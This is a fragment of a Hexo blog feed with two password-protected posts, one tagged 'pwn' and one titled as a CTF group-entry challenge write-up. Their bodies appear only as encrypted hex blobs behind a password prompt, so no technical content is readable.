db20ad2c793233a388cd585c0b255051b81c9fbad42d68444506d7c94417b7f6f2141af96b89bd034c501cbf563bd4a64fc99bbe3883f37eeeb18677aebdcb01751f84c5ca9d655a740a0414d78bd6b19bc02a62006948a86710933926ed7cef2a606f795fe21dac589e392a17cbc7034c68767d5aef40e8bfdffe033ac10844678b53b7c3368c9a1f070fa330d58e445266640a60e009b05f544a02c04acb365a4c4261138a0d17058aa5e3dc00fd484f8c93709b5e044d8faaf7a7944a68c4112148160de1b412ca99b122db06f25a91e75b9fb4b53ea0c90ed3c45a688e93c57d25119a6e2e3d1c7ac5cf170c5152e607e0b404b0fff0c22baa0fa554e666b1857f0859888f2c803f94c0ef0746414db0bdd761f31ee1eafa9929348921b3b4620cfc4892232f7082904f4ab9559bbf4231067064e3e7e7935c9b3fd04823f12c4b9fe7e40db65439ad6ea77f9a8a27518b2170d0bb075be1e9b29a92392aabb97620977c82b7b80284d494d016f438f798ccbfd49553a1afa89a3e798a35e48f2f883f230a4d0b4a68c9a16d7a5e124288d8bc3141348260aba8408a36c56e3917e324e2a33b2f0ba29c53e98689d019f4ea2298f2b937692626650fabfa41add723cbdc9993ce891106884e9a70619656f7f161e849c4cb006eefdb60114d5515aaf5c653a5eb8e4869c6d470bb1db1b8cbbd4ccf1d8f89d112731298e2e0aa7ffd4258911b02d7ee7cb8fc7900fdd30281c7ebb32088822c4c939b4af489c518c0e05a5ba2bc1b87ad8df1ba81dc64637918fb2717da768e08cb28c2d613b5ed463e636999b8fd0d28de1a5ff103793a02248f6766ce6fd81a62a1535d6124f94a74b5ee4db794c41950ef998b3cd67da8cc32b61bcfc5b34e30c84dda3689af375cf2b5fb1d6da3a28f92f7ec8412d15e431184d4a46e2c162d54a3f7ef0d81357d4056e2610d548863c0b5d54ce6250d8ec213e7097e74c918c20b7cd745fed45e506e1a34679cce020666dbe49109b847919fbbf7ab18d44c1e83e886c56dbc40985632ce6965aac04e3948c07057decf935578556977ec5d0c30d4cdb1c00de333eec6a6cc0bfe0501b3f56ebc6979af310870d2cd31b3c07c0a9049fb0576a7984bb4657e8b316b0cc2c8e37fbccda1936a3dd07bc5ca7824903eec43151e9931abfb67aa97781c205cce9c2d9d39a2b92693e42ee3d752feb867f97586a2dc9d31b8312c8259e3c9efa9232df5ea6a4e6ffb168339487a57ae256b12c31998048c1053b8d2efc8868ba645260fad28f12ec03a8aab8b479fdaebf618889679e1fac6a4a6ab459ad9f61092233c649acd5ef1aeba35647bc807e5fe338d06028de4b8bec588726c7aed94cc72e1cdd46baaf16c7d643375e8596674700c06cf2029f609157ce74e4e5a31f3332d8af3bf8c550d3120e0715d0e3ce6d4ef24840f2aef42adb27271042285f881e442dd0355620c14bd4a4228ac75f5f565c6c94a6cfad7fa46f811d8dd9b2ce87b04c12c37dc67898e30dfe062dcedf4561f04b95575b00c57d6d98dea1539771327f2ab8776bf15bcf8f24a2898e2fb9a89ed52449568bcefd3411e15075d3900737e52000d8674ce96830ff476311fcce56e90d377ca5736ab0a4d2c490c834e9cea2240b0871b7743a3fd7a92f17d6efa340ed664555f4ad2cffc76b494c1c24212b5166eae2224fd1fecc8451b32d1e9f3e0793ef3e39276a636230a137688889c7a603998919632e626b04f15411e0b983e4efc6428278fb95cc9676f0d00054183e6d62b4bff5c41cce79f2e73ea1c74412ad9e77c776e367fa3c6f08b1953e39d27874c878f0d350f00e2d395536a09b9f9aae172a1d775e29f7fbb859f1f6e3fba9ed8a0f5a6a3b0a31a13298c821a4688b2c31ff7e9addbca142b02bbbd8e5855d4cff83a5eec2f8d60f30511692d2341a826b513592ef57512adcd42979176f3366128f1c2ba5f5e6d6feb61fd13b95e163176991240f4035a2bef7d8199637111bde6e3b962682fecf55ef7d7d3d02a28a03e1fc9f1474a516769db2b465ea96f811f644720febb7702384c77a1d7c96ba549f8806f3d758392d5fa5c366568178c53a13bd8e45ae5c007f617a79b978a71b90596e7a2e5a782a821b823cc9a318b0b7089474af87530bb425c320a093bed0940725ec2d2b4306393623a90c0883a2fc026f53e289b9d7343ea4c45072de25359bcab54642b08c90cd9e2886262bb1d662d35fb595c0382ceeb36cd239cb7c5db83c3ef7d2202fa0e4e26a32270fc17f0933ae1b0a2b73fb347a6f5349b3ca65261d3708255f599e4adb9b08374e3b45b762645eba875021dbd38096323f1651a74b6188ce101e641bfb5f525359ece2dddad3d5db3e10bc3e7b855d7ad86f6422e30a6f8e4d058c1fb7c85d1bfa01a7a2da0facadcd76a528d3824a4d046324f151e866b21f8e46d5d94dd527296b1fc3ef692ecb73995cc5bdd5ad581c3a8c0757951ecf21e46c0c5549f37a2363150a72464ddd03faae3b34de1b8c018d3e8372467f11854991d7bb2ff64cc7b3042f5925d6bf12ef7de3019116b76fdec076e8665e56b07d0cba56cea015b458c1c2f52b9a2f3c50e268ed2b755ff2640909d34a6d291c5c63aafcb7d12a262a5554dddc2c485178d855463e36350ccf9ae0515f0f95db56122ab48f0ed08133e12b7242dc03a57542ef00805a72603053b0d17d0dccfc5033e55a8abd3657bad18ff7868be82ed132318af07bbf83d0866755b40d6b1a6c9021338839fbff36378b8a7a80b90b6762bcedc782f02592a0841ac47cf348396b481afa5b73efa35f3d7b0cc8688318ca61a8a0e5efdc43ecbcfb679f70d5aae22006f1bcf48d223308ca4b637c35b19db67b1d64405ae199cc461f469499851afc3057491d7575e1d8ac3a96f8aa20c3ff07fef4b270e6f41656e42ad4383f59561ee8afe774662811f6aecffed0627725b437f8f4bce6977d077f08713cd460add54ce4673e1802631fc7081db498fd8c87aeee607702af73d5283c971c6e46cf0d580ea52f1e6eb2d4c2b4aeb1b21279cde915ff270346cb0eb9c6a1ba6978d4622df80fd25bc8fc8a4ee4049d9b55f5b0b345465f0a228f24aa888cce789ef142f513eabe18f8beb30d91caedc00f1a809a619a14c1e7210998c641d76eccc34c8b70899eebb475e28f8ef33ae155dae1be3d03262aeee88c3106e5786d94a6c9f19f421c434dbbcf0c59c66e69a0fc79c4db577ac095b7db5946a7d98d84d77c3a3668efe4ebbbc4851bca3fcb46218d133134321ed1b53436474e5e3ea6472ec98c31d147e84124eb28c9c58fc66d8ed8d6c859f1326da6bddba7e49d78ccca5d9e7749c03ab41adaf6aae7dd3f4ca1ac8de41af8f83df66e4d9a1d7f40737d3425f9b020f2c83fea86ca4f396ac6fc7c549318612e09014571530ce46831d1afc0f2756a817d61903c37b202f5be483823df47b3446c66c48023259fd537968e284bd7e623ac8054245b147cb04ac7ea29fb90e32012d6e534b9f26f64904e5294fb8ad268effcb854ed7ff2eb7423b1a54f322ecba7e272fbe847c8140f47809673339139e7781d459025653a60f87cfc04ce6d147e34b9bb326adb3b6ab3ec77d8a722972cf46fe79aa740a0cbfa5da7254b55ecfc89433f44fae3b716569f8e0b688a9cdee8884e28c7dfa948c0ba8accaab9ba66fa34987e54bc67793e3c7654fa2c11a47f0afacaa9f7ee48ad8b29611818a811ac7bbd85a763262ea92df363f37505c1dced10ac2120ec26065f7cc86e9586c9cfd97f748491ececd7e09c3a8c26ddc1e23996d4dc7c099230e43cba5176746fc2d63002c10b73b3c0996d11d1478307ac2acee39a23d29503855da1b64ab1b2b1af75e7794e295230cc735b67a6811a5e67bae5a7999e3a7fe02756c33bb61b3e4a55740b6fb0a66d094748feba786e54ab191656b2c2be2d6c9f6d36a120dcbfe4157504cf31dc715a8881defb764c5980a76ac5474fdb819136da5a743928487d34ca3118359769f3a0605d3135c3f9ab084dda218d9976fc7f2cca9cc5111cbfc4c4c1a8c58d636dae44b0a804f23721cda9c2da9f795125b5b784d14190402b54a671df029d7922712a44758f1eead2c03c2b1a1335b3349d5d0f2d0f830d2f29997904514dcc4a9902ab4c5dbc70fb32ee3d09485cc9c99e5b73ab565982d7ae2298bdd22fae07e7060ea14e56e03a69eb7651eec891d7b8959f0c3a81f4922259ba0c2ec5f299e79ac21de62b424bbd4164b887c8e5a2c0ac60c59e73814fb108d8d6a85febe8854925a8e422defebb3a763590458aaf64229418f398bc5ba63d93504961d5e6b740481a52915d3572022650bca81a7662c790b8758fcc09adefe93707ff9f8fa43863673b4489fe24f7f6a52b6dc2adc7e2a3b2079eae8d2e60424df1fdc5c5a9c5e461b3384fc332b08803687608284c890209c9078aba85d6a26066e95be2c0bcb5664490e663036c74c7c8a9604ac622c25e7e0d0afe2ab6aeba5a5d0d1a5eb2193faf135dd027e588bb8b04c02591589a920ebf873dbd2f0bf025ab9d54b4164c6fa6a6ba6b3ca1e3e2f51a69b5488b8d2c2cc502b3a0620fdc15133e30582973a7283ae3f032e46e75dcc376836dc6094f7d131d0e3508e4cdbea4d6ee2b67cd7bb1896ae8796a6c9ea4bb8ff5be9773a99b2a9c61a61e0f8728a94aac2592a824b4971c0eb6201ae8a646378a5d1a8af656749bea759a3bfbc0403367eb0eb8c5f7ecf9e7d1dd207bb2102e78c54a9f9a0de5ff189e7b79b4393a570d9026f5ce2da587333e63f0e12a9fd189fc099896629f52a76f1c960b09e7a019baaa556f3074d148fb6ab04077b4a2e1473aa08406ae446043ce81580262f981523ffd65ff7b856c7680ce04c93c16833f0d38e7db7a903614a77a073d3104a627654d8d86d23c829d063c974964d23272a3a0cb8bad8e7d14c11092062a4e5a05cc57ce2f180cc3c341e393289d4d9418bf746b60915559f88064253b2b39bc349fd4bd44eaa8e1d15b552337a6a92f6251b0d167e60d11628dff072c0eb31e109a6a1d215401ade5bd90a9be02349bff99a10dd30a0b8abfccf0158ae03290a94b4f21dba715d5600283dfa4a185831dcb38c8b0cf53ebacc51381b1edcfdbd34ef577ac3d5b4a42820b1cebe24e31044b49f9367a588d7c980cc4da76a91478ace543225169b2f259092b9ecc2fe8fd47b03d0ec3a9502ab5fdd2a9fd4b6ae4d983803b014e04b52659f5b5a1bc1d31835c1e0915012225cb1e0475117c04ddf5b375e50b8724712b79481cfeeeb8d22a0f39d164f28fd43f25e9ddf44350675520de59437b6b3862599c947f921f5acc3b916ab3558a5a52019e24837a8f32441275f4cbb228bb150bed148f2efbb1979bd54546677be85b00db78dc762f42a8913c242e6e5e4bb7faea705cb34d9b6ddce60407a24c0c37ff65606772388ced20753b4c2b426e43f6fbd96897f1a3c1357f8d2ba790c6b767673689c5ad8a2b2c837c8c817664fec21e6ecd346f5b268594974f1a3155ee22c1a8e2fb4ef414b5078125d77ad44f861552ad6e9cee673125277c50ec1cdf00635c7ec14fdf815ee4b0ee13111d797784c6318a2ca6f4fd18e93e4ae143cbe4870a7ea60e421031976f71c746c32eaab70af6e3a8531982d29879277159751a1cb072b209b86c7cd96dc97f3ce1fa6ef8aa9d3b29e76a26706b875e4e0bfe475ae0366e448076db19a1c55d33fbc8d08349feaf3b09fc4f6a81372223a9632889f3014b3d5e3f004c8d7ac6a91341db12e0531cc4f7ab89dc3d282a7842fe9c85a2cc1ec921b14324c77e75ec82d29acb3632b4f2290ce00bd75776446223c741e55f86931ed4f9f1e7e0234f3b3461fae84e63b07a5b7aa3bca8634bc1625a38a68a1e7f9f89a321fb4dbb35a828117a85656ad498df9e67cefd94c3f2db13d1c78d765db79079d8d7f354f78559ffcce2edc08d0a41919503f76ac97c97ca6b532ef441c55f07bf917eec8867ef3df8607f05d1cb50019bc92e1e381d099aeb8792708a97e922858a885107b7987c10222eac948ce3b14924bf0a272b5f9544a3b167df010455e769946422fb5713e23923a1c335c0e3eab2c8f0dc20f5704046e2cd7ef9b379e78647b92b9e598c23383bbc496906619d2d78065921bfdb4ab573e9b274131a5d6285d465941cbe06c4a347a02104fa91b21dc30b45c938b3cee54ad554baff7e16d0b766f16b3bd84fa115ff661d7195b932d0dd5db5679e9a1f328d8937be4f49bb7802270641ccee89123bd5b4248a08df677b5b49ede82bb9bbc21746c53a85050aad35b96e41dbacd2277d738e2b810769654bed8699bdee4a13852d80684b51162bd1fa1f90826e1452786fe1d32941bbd3b9c97dc1ddda578bf064d4d393d255d71781ed6283ea857c17260c0e18d2af847fa33d4941598b2eaf9844d41a8db0d47ced5bfa49c40b9d67e133f6d53f1ee149f89af6aa127c39d082f37fbc95e4dad33fbbb837a589359f8cc808b4b722144c0e3c4de6986020dc693dca4a674e2f516daafc0a6a74ca1c555de55f17b09ca4a89d6b736f411cd1d0e6f0603213cccc5e7769a2f2a5fda7ef39fd93d55f196bda265964afaffc4d17fce715b1d6b453ebb2e46a3608f36c83dc68f1c47ee1e77f7c9a388260ba767cbaaf1a1cebce43e064eb5df5cd9468beb96b4e9bc31f0b9fed29b5b2df6310c84a0110c0662e8170651ff5ac1699b7da951ca33ab658c0abe89b35d313aae13b32df53b8e2174786e51d6757e30c9042af3f66b73247e4d3b95d4faed147b2490029d3a62df1a21838a0dbaa472ca72ac2ac182e11ab07c3e3a9c4e3651bb479bb9730b8d4bafac83824131655221eddd72810d8e418f5ce0c00bf29227d17574cb4b304db1a882bda2ec20ee9425911c43be7a246fb271fefeb736e96a05ad2e61005ab9eb8b4921c1400140e2c7603c359870893cd81cc8b4fa74ef9d40c929664e8f36b4613b339b4f5e7da9258d8d96cabbbb9c7d4d64a3f5f47caf7ed73c16d9c346b016ec4765ca7cf128434a4a56a0c9ca63e3a89507437e3f4cdfd0885772f137d2d2c925911f9d59a6847737c8b2025c7711735c321263c5cc39b15139987ece2775bed292fb3f75cca9de900f4e4f303b298486f91516049e9922d9b180ad84664c0bf19469e5bed2e6ba66c535639ed1949611b4653e4eb1722820d4591a2f200f904a1fb49cb46b5b03ffc3b6092209cac1fc14d63b5707e5cf71937f305a13e0becc876d7aa4d780810d7b35d406824b44372c260e7ccd300e60160b78826410344ae3bb1641f304d498ec682c9cc7c2f59340e48d3f7dac966675281dc722a1f75f90d1d5ec2afcb3f5ddf4802257407d601fd173fe5218437ee86b3c95cfcb499cc18e658651ec83ad01ac3e40dc8d27f18076f6587410eeeabb5e7c0269c873d63d0bc6961c931db789476eed7c7515df24247e2801b518811db53d0f5668a384edd97d17965883db1f9ff4202422be5cf232ed7cb5b3e1b72051bff87656dadf85880ffccbc5f3d40c1a1cd9d9f5705ca9b6fd4b3aef70a4ae97229e628ddf1d8321b42f26899f4602cc435e82178d9f2e640681573ae1161807b67d590bd648c64b6a67f88535a5c9a7b359fd1c311c0f066567167cd9e0e25cb1672471ae2ccc3397fbacc105bab25e7cfbc5445ac66af6b194cbe4f60f7fc4d48f553875f281776409768f0401300aaa1ed011e75aa7b1253bd80906f26c7669e69fb1f1447ea5376b61bc6d5f23a5bb590b71b2e65ffab3dea16f8fe87cfbaa55ff0562594631a27cb836f0bcfc585bde5abf23d609236520002f51f24f973187a556ea8b556f9f590a03df8ed3134901e52c8918c934caab6f52b74b77bbcf49d66bac0a54f80a950edc5e2d0a04b53be364508ed954bb26009b32b735faf37c3bc11099cd46f7452c20d7e4aa235587fb91f2666a7f52f8d0c848d2a96c6d787a9f3f6213d047eef0cbe5627f0d5f58f1c4e418bc513b45b086d71d9d6fea5100c592b3b4895cd4f3db889544c443cf77d977fa6ee5736765a661910e227310e11fc07326e2e1c97e58859773624841723c4d589910a8df2453db54054fcc382d3c729a69aed2682029496ca184d67c6e4fcfbb4c8930bc456b2c0c78ace29f43a98adc6a311cd56121de5c299ef7619c66fcf302181504322703bbe9224ff441b5b66b41167394b51dc63132059c6103f270bf401af361f8234fda4c5b2f1d55a4f87dcfed61732984e94867d1702f3daddb0efa26ab8b90036bf5be2eb9c0bcf5d4bdde3d03f04d761a20441b59a4d1210e8aa5e4676c91dbcb3f9873515d308a7bbc1ef2d1286ef54c62ad9765361db81e51992ef4a8380159f058aa9e06f58822896d0de801ca3565b0c7d57f761e152e6228ad984f598eb067de0c8e471baab05eb2733e51fcbc5004fe1de124ffb9822457dae3fb86c754a1c7ca133294bd85f19b353d6e1f747ec15723ff20a879239744ca4ce61db01e3f152dd7e08bc94cd90875469304a20a136a7a3440b2ebaafec1e9a9da85de0ec752c09ad7f71f0e513621edacbad2a4915abf7f97f578e326328a72fb5285680267b64cafd44e47549b9aeeabbf87445cf14dfc8f6254df3a9036fefee208922cc00a6e0c6d7d32adc0478f9db9f5ab68fd5ab7966254f3607da20725b8f6911407237479b4c5ab474c3b29b03061c94cb2b36dfd92413dec8ef049c2eda2afa9cc522bf2af36474ca065ab9e3e277e14e6bb832955f58409134f2b0bda40bc891226b06153f6059194e9a1db9385832316d7c678afa988dfccc9bf1006248d13ac33aabc743edbf029d10cb3d99604cbf0396d266ff6f90018a3f9d8a51be66c00d3255753fc774c1e42534a1d274a31462b01c1f365ee6fe83fa2e98ffc7a3a8ac6a53a365fd582195ef22d0b9617ee5ae8e14810fb4415337be3c0293d532c4089088e858c348e99ccd814814eacb7b7dad945dda9bfee60bf2bd58445baa4308ac6cbdf19a8f2dee8d998424eb759347d0c4fa36cf029af3c778459f08cd1fa675a2844fabfbf9df492e6e106325468e4a2d5ef9503a470c177fa804f603a44c6bf19c2925bd8b96a9cabd5e3f153b3c4678b718f991728484375a755b1359d5109593d0d7d7ad5461d22afb75bb66d48c450e6d877aba018e90898e7e0a65707f579f9480a406cc44ba43ef711921a23c</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Black Watch入群题题解</title>
    <url>/2020/04/12/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="634a056c2225c701336fd2b59f4963ad40289c6e4275b5d57968e946fc32c291">a2a1fed5636301373a58dde46249bba5b752491e8e5c89144cb4d68a719f55308d9f959959a6010e2771267ddf5d75c17fc7d36bece806628895e4ec922332cf7e2af6aa0cf84125ef48f264bda91c354846b2bf7f31b1f92581f6debe100f678b565174ee18c6ecc68f6873c480a6ebcd69e22d507596a4d659e75804fc7e6eb741c12b3e1e10008de24d8be12324da4f8405c697ec1c110b307ce04cff2f934fcb233f42a59d606d7ab1fedfd57542c3a54c9f874ab8af5c4c5c654a2edf6a27131719364f0c9d034d08314e1b39c68d73616e88afb0680408327112abbc7655efff53dcf5c258c50783ee5e6be4817a7d68713162d7049ac03bdd99454a66026c47bc7fa9bcdf814d9a39e6dd60658b61d0a9364a8369de5c82f5b5f3eb45b9b8cebb42e7079126f567f34e33c3f7d5977a0269d01f0dc05666048c3b3ba93c018761e25ef8c7e076c13f6bc1e47d3c4842801de256e10dbb684af1337fa83838dd3893c17bf03aefad7ceae435ac8322f79bee6f7f546f51a7dd657aa0bbbc2f80c860f4aada31ead7b23d3e9c12e93a844c1df4b3dc17d256368f59b6149c0bd3470476a4bdb9b8d6f046c5f75e6067ca0c6be231dd761fefe93b29c9b91dcaa0683a7ab510c84b989cc2e8f0dfdd9653c650be37c4cc20095e98307fbff8c74992b66db370278e3622f6055b56ee6daecbea6c6630219cd633c448186e3efb706894ac749479f1c5b4798cbf26a2eda9196d5b8db30262fd11a0443b98b87e3c6d84dd28793212e0e5daa239fedd3fabe67aa5f5f3d8a3232937050590c7aadf56dd19fa9a7dd45614086d8717d569fdf6b1514218c1a4b1085d13de83c5b078679cb0167e08f96ed6feba54cbc7e7ba2d0b5070394b7a1884dc40119d669ed81239b51068c11d00ced2c9945f658e65a227d82235ac7a8fe33eb6ce62955864a6c4e9e0546370f128efd91a894e4e670e87f01d36f29ad3eaf41ccb41282a3d26d493d9038ad47292a9f394eecc57573924e6eb3a1fb0feb4fc78579729f6b6d7976d78384a60d99c893018e3396da23a957771b6c515e1e5bd30bc8717e90dbde6fc7da4e2406d60d6b07e34d49f8620763c51b847e56446750407def2184d9a179c4250cd9d6251912b78e2df46c4d9368688c5f5205bdbcac61cbd7ec6be17d6686018babe672c036c6766c65b4bbf21b33fcbda0242fc47c5ccac16b4499adf40dd0535cb72a7097b06b407844d733c45f39ecf6f44dfa67efd40a20ebaf4f8ade37822575671cd7bafbb79a84f3291c72d8056e763be5332cdb2f0ed887fcbb7153bc4496dc4609c443e76a247354b5de91870b0e2335005f92b011c8aee736e7f45733ad5641bc1a405dd23b99164ca9b30357a5bcb40c8f4905b2fa2c9220a907ab8095ae449625720105b301c497a217b9e0c57a2b9ad1a942926d2987d8874c5fc11c2d25af124a80daa8b476904e87de36b08aa24814cd257d6cedbeff3fa5adbdcb2040f37c5a4ed542cd8c1f09052ba985e00ed5fbf394d0d3e929f0b502243ee43775f2442cc3566fd36600a8fb02267ac67819cbb3a166557d27214d99098776fed0ae0e63e84eb40aac50c412854db0c7823efa09a45ae5f01157609f02f00f0c78ca978f60642002bff125ca80a1c57140158037561ed11cbe82c10b00cd0dd80faed2ad777abac64f331d115bbd3e4b36849616d4c5180bb5589d773ac1e3a9f9d3106c2c5f23a093afe038d56329b0ebd184917441a1f6322aa116dd214a7e6acc59352bffe5be9d53f00f7d1056b6fb9e1c6e05604a0d48fb010f519fc4e2d72b177c95dffb8649a9332359e0b181c5b538f085478a3cb76c3ea0ceaf13070661efec20a93010a6db5243ca271756011cc670ddc9ab05818d511244880b09bcd5b5c4bd5f10bd50857026c46b70102a64ad2831aa981c2cd8f7d824e3cdbf118df44977bc92208e96965c8f7d172657415dfedaab36fb517894ddba689542166695cc53e4027ab8015593f0537b59a477001d494303826fb405a5822176332234a9a52497152d2186c45be2fa0e25fc448a2eca989e7c269b3447c6ea55fc9c667c714c8658f1dc312b1bcce40244c7245774b024e87603e0c5ca211568f6863b912679d609f4003ef3d4c55c5be87f07337d1eea0f44760c5cdd32c2daad818162a12a10bc8f1a440e4fb00aec17ff7faf5307c82bda0024627c5acfff40a9ce81e5a515ad8c90ed113fd3c8952d246721eacb4985625f5a222f0fee916835de5e4f5f7e845a2deb0331273dcbfc28ff934bcc5bfebb392f4a3d3497fda62713556334f361a75ce42acfbf717637366c302ec4b3fc1efbd1c83c5dc965637af885aada675f411f664e24cf5a9fd114436267c4038194d695fa4706922f5927d1bc0603960806f73282fe16706109d2b04f6d0d04f731476a680dbebcf673da153de7089e63695059882d49abee9aa87b8e393a9a5716339d3cdfdc70a491b9ede26269f28743310e07807d7493cee66e62cf67e294ad7ddb7db44e96e5d2c666bf083802a713a2ea0c8975559912a9e7d1c493fdfcacd0ef7b77cce6439d559c051fc4ac9b6fcc9c319446998f229514203ad25a9cd8e27c75dcd41625aa8ad8f3e15095820b23b5cc4fe365761429590aa9ac9a0b55c03a81b5847c990abcb15306a9b811828916c8945d893c623b3b29b6d8106c5652d262e5f2904972f0fb263b8da36061fd7ae379becd436248dc6bc6595703e859ffd0a87a0c0b457c8a3fb530138c12cf5979dced8c116b41af088dc68e4841956d01aaff3b7e6be565a0b8aeb6c6b1e8619b3c99c7f7e66b7e056e06cecf6a70d088755ae26d73c0cafda66071576ebe4e435482cd211de6be3a0c1543e47a3f29f1687d2ea7e64e2ef1e8838210535758afcafbd194df78720f8d5e2af3bfcc9c3a355be28e99ff5d379f2b3d1a57a7f451ce48d5fe9b3ad2458144dbe670e34de14c206d9065a042646b1244642aaf2d9f1f21d7807b69dec4c6d2eb54ccece1d8986cc12ca6b8960c41fcf1b349446628918c7c77926867307a43222461c915922fa5442a1fa5442d2765e1fa5e504aa64ac0a9fdb39ff921bc115696c6e790c490541dc319c0bec2e3ba06c38c57b754da65fbd10670f5c7b3e9d9402ce4a3a2f05fcf752ebf0a69cc270921713525abe1b798aacce428718198773a2ff637cfdfe78264907a85c4c6e5e9a568c9eb52f2b8df640727bedc4df7131b56ad17b7d31963beca63dea0ecc510552ebbe2e4e6a1ea5260a77f3bcdba587f6d054fad5d1fd682155a55b0f7b1e8840096705edfb1f6fb7d82de4b71a7fa99deb0764ac74d59ac26732433f89c3979022b372ecd88f1932486bc540ee654165652ad296d6b02aa284ddc94e5a408578206a90131f569d161f4f0e4749d851eda0e4e6519b4359506b9e07e831a3c5ad5007e1a286d9789a2028c1738f28c39109a0c3b25b74a3b7b01d3d65c14f455bc2b4dce3a5f2a4ff330d509a6abc67ecb18ecc58a13714173989e146d670e3ea803505e7a9f910753dd0b5687d9e47c6fc54c3d1e1b2f04005818e174ef3c517cea93ac92dc904365a59efc5ed98adfea16407709c4ce6cb0847ac6a22b76b3a341271b6cf3f80f8e530f876be304309f00e37f8e3789fac44a24e204ce19b2dcf41b45cb0ff0074d4bb885805d4e14e938f951144259933205f4a6145160d2c007ae9705dcc47c8ed6d8260b9c04d9daa8ed61c896c5eccc98f10c45e9dbc7f6a3dc5661a94299cd16bea72b1880c7a8b95a67ff09bf7a9772ae53b726cfb299bf8daf5e1f31938592ed00cf32748683a481261e7c08ed6880ef0d2294227c0c90f352aa14106d3918eb6a12d9fff826bce7455a13d2d26b19c95ae3596b6c85df7e1b210c0b69af98890914f9da09dd3cfbae8e8d4b1ece71547658e16b3d9b1b4305f38ccb8f9de1e2f8c933464af50bb3de9a58fb345c11de90b1aceac8554e4a8812f14cb1e884bedacb5b199730a71b25b1587c7bb83016d28e73a9f31716375f07eff969a5948cb462cb2e6cc0e2fd445bb19e8a805b5d05c692883dcf7712216e2509b22f0b482d60c90f427a68933368a70d7b1dbd472ee60cdf8f62965af85fbf8f74c04de32606dc4480bc607f9a6de553cecdb71fee882f0218755febe4d680ab37ea82a4d2212bebb1b7d16a5bcb09eebcf49780d5c51a2dcf496baf294f4f83163dc06ebda6303fe3d1dbc4c60600b811c6811e3d43eca58d3dbcb175824bb7a5088f05ee6727edf677053d2f8dd459e4a4151525d3902e25f820585fbb1b3e6f4898bf292dc6f7e0bfd0163f627662b34afe019c5e9a14c0d66dfb838ea47f6691bac3ba0f2d4ee762222e534f9ae01099f3b3e3f32ac52850fac0c1cd424781bda37df9eaab03d0d0e1f8c4282ed5d7fc26deaeb7f26b7512675efce2f72178406cd043f82221ea4f1299e8bec5c0f5d65c841470890acdeae1e273e45ffdc53bfad80368cd5f9fccaecc186e5358a3278c21cd9e02e2ffc79e072e7e899c4e24e27b8bffb5d1da5249a4a765a35e415e8de02d0bc1b1285d20e085421b6555cbee44c14123b77743329daa6df3f43e844171460618378063c714dbf9bae76f68aeaa9af4f88d32499f59be9b91f8f06f867c688836e6675f680443f025022ab486988d315e00f0ad6a8fb61cd47284542212ea03edfb483c583333b191162e6ef65ced745fa38d3caa604e7bd605b3d4adda43e40a4ddfd93c4804ada93d8a3949cf4c9e00abb6e2e97dd2659ee800674b391e92a55eb49d9d624f8872ae503a5ebe4c955b9e5abbe770fc09da8a4855757255548fdc6c8827b2ff440426906bf5dc33bc1c5fc4b60eaad1d35f6c16a32cd8edd5cb0c8530c6d61707e803592b3d19f0fdb63de0d4aca9bef35d535cc847f6da4a0a36f51cee954413935d30405e196a0d840a22e0d4f0ecae80c5182e8a071dc9d123c5a09a60415d1b524866148a341041da41f03cca50d7d28af9fe56babfec8e7f0bc47e77e3353c52bc3d22ab24fd72d0eff9780ce76d6a1a35d5aacec3028ee1361a598263f9c9b50f7e229d460a6020c61d71262b05e5c44018320f09230211871088abf94cec151760eb7291bbc5809785c94c6b7b91ae7d1780bf7fb82ddc2aa590fd0a5b1cfbfbf5ddd41982f6499fbac5e07ecdc38d1478349156c26d17cc865d088594c501892c76ccad79cf8635e5e15baba2129b377c98acd09b5c3e36fcb4532dd38bd3ce3bac8aac13029970837817ba99292d1e14666bead75e6aa058ee9df96cc5202d6090e54d6e453b76bd4a6db50a4c3525e428c517cfc10bee9b5e6e87f4c66228e9393a7a099e42a45cbb2a5ca5f94f86efdcae42f65684af85bdc0498537c8d30c9694b8c07fc090405a3804c9dfd6be860b74e4acc9ef122fdfb4d9f4a54f1b91c2a202ad1c3e629c525434cc4948936f527fe5862af9c6c779c5615d1d329604d309febc7fb7332fcd5ca7db131dcd5d16cbdeab6e21f36bfd76b16acbb83f8d056d785931b97b282d615fd39178c0cc09f5afc84b951654ad505ab3066a69ef6da3090a2eeb31027808727a8344ccb5a4fb86dab2def45da022fc62345b0585570525fffbb5d27036c604908e36650c4f2750b179613168939073dd179b1fc6e26374a365f050f716d19f650535ec4c45ba1978cee5c48093b717735879a59944fc5c56ec9477460dff8d889c8b92d3ebd5d210b7e9f8fffb84cee159683f8f3c37c2d7008eba85b34d6722432b2016596767a3431d2d055814d8cb3645bea69f29b163fb3edeabd8a08a9dbf06b391ac0a2352bfbcb10d3a3f5970f15d97d8b396d94342f85d1d9673bbe07d402571899d17d1d7bf994c2d4328a1604d20021c67a39c7ecbfc09ab6ac7f84c857ff4bba7b0f2d65252ab7a9c1fc99cf20791d41a99d1913c112277e723f065b44ef59963aecf10b9e95bdb46fe191349c3dd67f0be5614e546458c4b85897a00f1cc3d9e2d7dc03197ffe129a19815bffcb59eb1be4b41bf28917a881c4e1209361ce2c577e1227368e46771ce810212167047e5f1de9d041b5b4bbe8674f83faab6d9f6b4f76c260469258bd0c9ceca7803a676722ca94e7889dcc82635c59cc27eb7efed4d07c9262c52bc291c6c1cbc41f1f4056b289f9903f84a7e7a9acbe9e3493e14300dcaf9c1c624d5d53545d33e5ffc3eeeb20d7d8863933cf38b89d6b5cf184c9c672e019e8ba4f9d67633a89800f02ea9b33faf93eb0347a48ef4c098132d67514e368ae1621041149216dbdda40ee3bd9f383666bab77f4ba7040df8e7b528de7cbd35b69edd06f4ec10a0b0a4fd034bcd0e0a4765575607ee6647f915c59cfb25b750d5cb0cb6629b439ab9249a4f5521013f2e40bf47d10e5f3b591f555ec4504ab67315bf84bcde4f189b02b55baf9dc84a0494543cf2fdf310ce778f61a4e584a086cc8a40b946afc33beeb5056b96e7232461dc74b3106779c223d17998454c4823291